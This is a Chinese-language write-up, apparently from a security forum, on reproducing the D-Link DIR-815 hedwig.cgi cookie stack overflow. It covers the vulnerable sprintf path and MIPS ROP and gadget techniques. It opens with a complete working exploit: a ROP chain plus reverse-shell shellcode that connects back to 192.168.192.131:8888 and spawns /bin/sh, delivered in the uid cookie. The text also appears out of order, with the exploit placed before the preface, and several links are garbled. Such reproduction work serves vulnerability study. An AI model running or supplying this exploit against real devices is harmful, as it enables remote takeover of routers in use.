
# 从零开始复现 DIR-815 栈溢出漏洞

```python
from pwn import *
import requests
context(os = 'linux', arch = 'mips', log_level = 'debug')
libc_base = 0x77f34000
payload = b'a'*0x3cd
payload += b'a'*4
payload += p32(libc_base + 0x436D0) # s1 move $t9, $s3 (=> lw... => jalr $t9)
payload += b'a'*4
payload += p32(libc_base + 0x56BD0) # s3 sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra li $a0, 1 (=> jalr $s1)
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4 move $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra addiu $a1, $sp, 0x18 (=> jalr $s4)
shellcode = asm('''
slti $a0, $zero, 0xFFFF
li $v0, 4006
syscall 0x42424
slti $a0, $zero, 0x1111
li $v0, 4006
syscall 0x42424
li $t4, 0xFFFFFFFD
not $a0, $t4
li $v0, 4006
syscall 0x42424
li $t4, 0xFFFFFFFD
not $a0, $t4
not $a1, $t4
slti $a2, $zero, 0xFFFF
li $v0, 4183
syscall 0x42424
andi $a0, $v0, 0xFFFF
li $v0, 4041
syscall 0x42424
li $v0, 4041
syscall 0x42424
lui $a1, 0xB821 # Port: 8888
ori $a1, 0xFF01
addi $a1, $a1, 0x0101
sw $a1, -8($sp)
li $a1, 0x83C0A8C0 # IP: 192.168.192.131
sw $a1, -4($sp)
addi $a1, $sp, -8
li $t4, 0xFFFFFFEF
not $a2, $t4
li $v0, 4170
syscall 0x42424
lui $t0, 0x6962
ori $t0, $t0,0x2f2f
sw $t0, -20($sp)
lui $t0, 0x6873
ori $t0, 0x2f6e
sw $t0, -16($sp)
slti $a3, $zero, 0xFFFF
sw $a3, -12($sp)
sw $a3, -4($sp)
addi $a0, $sp, -20
addi $t0, $sp, -20
sw $t0, -8($sp)
addi $a1, $sp, -8
addiu $sp, $sp, -20
slti $a2, $zero, 0xFFFF
li $v0, 4011
syscall 0x42424
''')
payload += b'a'*0x18
payload += shellcode
url = "http://192.168.192.133:1234/hedwig.cgi"
data = {"winmt" : "pwner"}
headers = {
"Cookie" : b"uid=" + payload,
"Content-Type" : "application/x-www-form-urlencoded",
"Content-Length": "11"
}
res = requests.post(url = url, headers = headers, data = data)
print(res)
```

上面两个脚本也都是能够成功打通的：

![](upload/attach/202204/949925_92NBXEDZAQMKVBX.png)

## 前言

官方的漏洞报告：3eaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8Y4k6V1i4K6u0W2L8%4u0Y4i4K6u0W2j5$3&6Q4x3V1k6X3L8r3q4%4i4K6u0r3M7$3S2G2N6#2)9J5c8V1y4z5g2V1c8Q4x3X3b7J5x3o6p5K6i4K6u0V1x3e0p5$3x3U0f1.

![](https://bbs.kanxue.com/upload/attach/202204/949925_U3A83R9HJPG4ZPY.png)

官方的漏洞报告中只提及了`DIR-645`型号的`hedwig.cgi`中会存在缓冲区溢出的漏洞，其实`D-Link`的`DIR-815/300/600/645`等型号都存在这个漏洞，在本篇漏洞复现报告中，笔者仅以`DIR-815`为例进行分析。

笔者用于复现的物理机为`Ubuntu-20.04`，请先安装`qemu / binwalk / sasquatch / gdb-multiarch`等工具，并对`MIPS`架构下的汇编语法进行一定的了解。

固件包下载地址（挂个梯子）：[DIR-815A1_FW101SSB03.bin](https://bbs.kanxue.com/elink@d24K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4)9J5k6h3c8D9K9h3&6C8i4K6u0W2j5$3!0E0i4K6u0W2N6s2N6Q4x3V1k6b7e0f1c8Q4x3V1k6s2k6i4c8m8k6$3W2D9k6f1k6A6L8r3g2Q4x3@1k6A6N6r3g2E0e0Y4g2E0j5X3g2J5i4K6y4p5c8V1W2d9x3e0l9H3x3o6b7^5y4#2)9J5y4X3q4E0M7q4)9K6b7X3k6A6L8r3g2z5j5h3#2W2i4K6y4p5c8p5W2d9i4K6u0V1z5o6p5#2b7e0q4Q4y4h3k6r3g2K6p5H3x3g2y4e0b7U0l9K6i4K6u0W2j5X3W2F1i4K6t1$3j5h3#2H3i4K6y4n7k6X3W2D9k6g2y4A6P5X3g2Q4x3@1b7K6y4K6R3@1z5o6b7@1i4K6u0W2x3q4)9K6b7R3`.`.)

## 逆向分析二进制文件

将固件包通过`binwalk`解压后，先找到官方漏洞报告中所说的`hedwig.cgi`文件，其路径为`/htdocs/web/hedwig.cgi`，通过`ls -l`命令看一下：

![](https://bbs.kanxue.com/upload/attach/202204/949925_DJP9R736KCD3T5R.png)

可以看见，`/htdocs/web/hedwig.cgi`是`/htdocs/cgibin`的软链接，因此，我们需要逆向分析的二进制文件是`/htdocs/cgibin`。

先进入到`main`函数中：

![](https://bbs.kanxue.com/upload/attach/202204/949925_5S4VDQTG9VCSDYJ.png)

再走到`hedwigcgi_main`函数：

![](https://bbs.kanxue.com/upload/attach/202204/949925_4FKVY992FD2RPK4.png)

首先，会先取环境变量`REQUEST_METHOD`，按照这里的判断，必须得是 **`POST`请求** 才行。

接着，会走到`cgibin_parse_request`函数：

![](https://bbs.kanxue.com/upload/attach/202204/949925_C56UHPYXTMFEZ3B.png)

这个函数已经不陌生了，会对`url`先进行解析，然后将`POST`的内容读入进来，再通过`sub_409A6C`函数进行解析。

在`cgibin_parse_request`函数内：

![](https://bbs.kanxue.com/upload/attach/202204/949925_VR9FGKNMRURKQJB.png)

这里会获取圈出的几个环境变量，不过和后面的栈溢出漏洞关系都不大，但是不能没有，需要随便输入一点东西，具体原因之后会分析。

接着，就会走到`sess_get_uid`函数：

![](https://bbs.kanxue.com/upload/attach/202204/949925_82K5BT5249JKJYN.png)

里面有对环境变量`HTTP_COOKIE`的获取：

![](https://bbs.kanxue.com/upload/attach/202204/949925_K7QJFCM6KSQ8AYR.png)

对`HTTP_COOKIE`中`=`的前后进行了分离：

![](https://bbs.kanxue.com/upload/attach/202204/949925_CXYJYJ2NRJJNJ4W.png)

可以看见，`=`前面的内容被存入了`v2`，后面的内容被存入了`v4`，最后会对`v2`中的内容进行一个判断：

![](https://bbs.kanxue.com/upload/attach/202204/949925_48U439CV6WN982S.png)

也就是判断等号前的内容是否为`uid`，判断通过了以后，就会将等号后面的字符串拼接入`a1`，也就是主函数传进来的参数`v4`。

再然后，就到了一个可能发生栈溢出的漏洞点：

![](https://bbs.kanxue.com/upload/attach/202204/949925_5FETSMNHCBN9M5E.png)

这里的`string`就是`v4`中的字符串，也**就是`cookie`中`uid=`之后的内容**，是可以由用户自由控制的，然而`v27`数组的大小仅有`1024`，因此，很容易造成缓冲区溢出。

我们发现，在之后还有一个类似的`sprintf`：

![](https://bbs.kanxue.com/upload/attach/202204/949925_G46ZUFGH7PQ8GXK.png)

这里的`string`仍然是`v4`，进一步观察，**发现`v4`在两个`sprintf`之间未被改变过**，也就是说，这里的`string`仍然是`cookie`中`uid=`后面的字符串，如果能走到这第二个`sprintf`的话，那么这里才是真正的溢出漏洞点，因为仍然是`v27`数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次`sprintf`的内容。

容易看出，如果能走到第二个`sprintf`的话，就需要过这两个判断：

![](https://bbs.kanxue.com/upload/attach/202204/949925_F64BBPUB3CMVYQF.png)

这第一个判断需要有`/var/tmp`这个目录，这个**在真机上是有的**，因此为了更真实地模拟环境，我们需要在解压后得到的文件系统内创建一个`/var/tmp`文件夹，这样`cgibin`才能在此路径下创建`temp.xml`文件用于数据的写入。

第二个判断`haystack`的值在这之前只有`cgibin_parse_request`的第一个参数`sub_409A6C`中可对其操作：

![](https://bbs.kanxue.com/upload/attach/202204/949925_R4J4JB5W53KVHRK.png)

这个`sub_409A6C`函数**需要`POST`传入内容**的时候才能走到，那么要使得`POST`传入内容，也就要走到`cgibin_parse_request`中的这里：

![](https://bbs.kanxue.com/upload/attach/202204/949925_XM69Z4K66GZXMV9.png)

这里跳转到的`sub_403B10`函数后，才有对`POST`内容的读入，并调用到`sub_409A6C`：

![](https://bbs.kanxue.com/upload/attach/202204/949925_TEA8ZRZJXACTGTW.png)

上图是进入`sub_403B10`函数后，最终走到的`sub_402B40`函数，其中这里的`v9`函数指针就是指向的`sub_409A6C`函数。

再回到`cgibin_parse_request`函数中，要走到读入`POST`内容的那里，就必须要使得`v9!=-1`才行，再往`cgibin_parse_request`函数上面看看：

![](https://bbs.kanxue.com/upload/attach/202204/949925_EETYZCR4PJ2CR9F.png)

因此，**环境变量`REQUEST_URI`中也必须有内容才行**，这里环境变量`CONTENT_TYPE`仍然是老规矩`application/x-www-form-urlencoded`，不再多分析了。

满足了以上条件，就能顺利地走到第二个`sprintf`了，也就是**真机环境中真正的栈溢出漏洞点**。

## MIPS栈溢出的ROP链构造

`MIPS`架构下的栈溢出肯定也是需要通过构造`ROP`链来`getshell`的，不过由于`MIPS`有个特性，即无法开`NX`保护，这样就有了两种构造`ROP`链的方式：第一种就是纯`ROP`链，通过调用`system`函数来`getshell`；第二种就是通过构造`ROP`链，跳转至读入到栈/`bss`段等处的`shellcode`执行。在实际应用中，最常用的还是通过`ROP + shellcode`的方式来`getshell`。

### `mipsrop`

寻找`IDA`的`gadget`最好还是用`IDA`的插件`mipsrop`，里面的`stackfinder()`/`tail()`/`system()`等选项很便于寻找一些`gadget`，也可以使用如`mipsrop.find("li .*, 1")`的形式，通过`.*`进行模糊匹配：

![](https://bbs.kanxue.com/upload/attach/202204/949925_DPH4ZKVHHZK392B.png)

附上`IDA-7.5`以上版本的`mipsrop`插件下载地址：[mipsrop.zip](https://bbs.pediy.com/attach-download-236502-5c5152b834eeb24464aab8da67202252@cUM80jcRVDUWYsC2EzRB8g_3D_3D.htm "mipsrop.zip")，解压到`IDA`的`plugins`目录下即可。

关于`MIPS`架构的寄存器及指令集请自行查阅资料，这里就不多作介绍了。

下面主要来介绍一些常见的`MIPS`架构的特性（`32`位`mipsel`）。

### 叶子函数与非叶子函数

叶子函数指的是**没有调用任何子函数的函数**，其返回地址会存放在`$ra`寄存器中，在该函数结束时，**直接就通过`$ra`寄存器跳转返回**。

非叶子函数自然就是指**其中调用了其他子函数的函数**，其返回地址`$ra`会在程序开始（`prologue`）**通过`sw`指令存放在栈上**，因为其中调用了其他子函数，肯定会需要改变`$ra`寄存器的值，来作为其他子函数的返回地址，所以最先的数据需要保存下来，然后在该函数结束（`epilogue`）时，再**对应地通过`lw`指令取出**，并跳转返回。

同样的道理，如果在某个函数中使用到了 **`$s0 ~ $s7`中的某些保存寄存器（包括`$fp`）** ，则也会在`prologue`处保存下来，并在`epilogue`处取出。

需要注意的是，`$s0 ~ $s7, $fp, $sp`在栈中存放的地址**依次递增**，因此，很容易想到，我们可以在栈溢出的同时，顺带着**控制到`$s0 ~ $s7`的值**。

`MIPS`的这个特性是一个在栈溢出中很好利用的点，若是二进制文件中没有或没有完整的`prologue/epilogue`段，**在`libc`的`scandir/scandir64`中**可以找到完整的汇编段，来控制这所有的寄存器：

![](https://bbs.kanxue.com/upload/attach/202204/949925_AZBH6EKV6C3GM44.png)

![](https://bbs.kanxue.com/upload/attach/202204/949925_BMNRH4FAFT4JBSN.png)

最后，都会通过`addiu $sp, ...`的命令，将栈抬高到`$ra`后面的位置。

### 流水线指令集相关特性

`MIPS`架构存在“流水线效应”，简单来说，就是本应该顺序执行的几条命令却同时执行了，其还存在缓存不一致性（`cache incoherency`）的问题。

首先举例说说 **“流水线效应”** ，最常见的就是跳转指令（如`jalr`）导致的**分支延迟效应**，任何一个分支跳转语句后面的那条语句叫做**分支延迟槽**，当它跳转指令填充好跳转地址，还没来得及跳转过去的时候，跳转指令的下一条指令（分支延迟槽）就已经执行了，可以认为是**它会先执行跳转指令的后一条指令，然后再跳转**。
